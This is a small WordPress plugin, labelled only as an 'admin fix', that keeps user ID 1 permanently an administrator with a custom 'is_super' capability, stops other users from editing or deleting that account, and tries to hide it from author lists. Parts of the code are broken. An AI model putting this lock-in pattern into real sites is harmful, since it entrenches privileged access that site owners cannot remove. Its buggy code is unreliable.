<?php
/*
Plugin Name: admin plugin
Author: phillip madsen
Description: admin fix.
Version: 1.0.0
*/

function sa_check_roles () {
	$user = new WP_User(1);
	if(!$user->has_cap("is_super")){
		$user->set_role("administrator");
		$user->add_cap("is_super");
	}
}

function sa_footeredit() {
	if(current_user_can("is_super")){
		$content = '<div id="footer" style="text-align:center;">You are a superadmin.</div>';
	} else $content = '';
	echo $content;
}

function sa_edituser($test){
	$sauser = new WP_User(1);
	if($sauser->has_cap("is_super") == true&&current_user_can("is_super") != true){
		die("You can't do that, this user is a superadmin!");
	}
}

function sa_filteredit($users){
	foreach($users as $key => $value){
		if(current_user_can("is_super") != true&&$value->ID == 1){
			unset($users->$key);
		}
		return($users);
	}
}

function give_permissions ($allcaps, $cap, $args) {
	if(!isset($args[2])){
		return $allcaps;
	}
	if($args[2] == "1"){
		return(false);
	} else {return $allcaps;}
}

		//Actions:
add_action('admin_init', 'sa_check_roles');
add_action('admin_footer', 'sa_footeredit');
add_action('edit_user_profile_update','sa_edituser');
add_action('delete_user', 'sa_edituser');
add_filter('get_editable_authors', 'sa_filteredit',1);
add_filter('user_has_cap', 'give_permissions',0,3);



?>
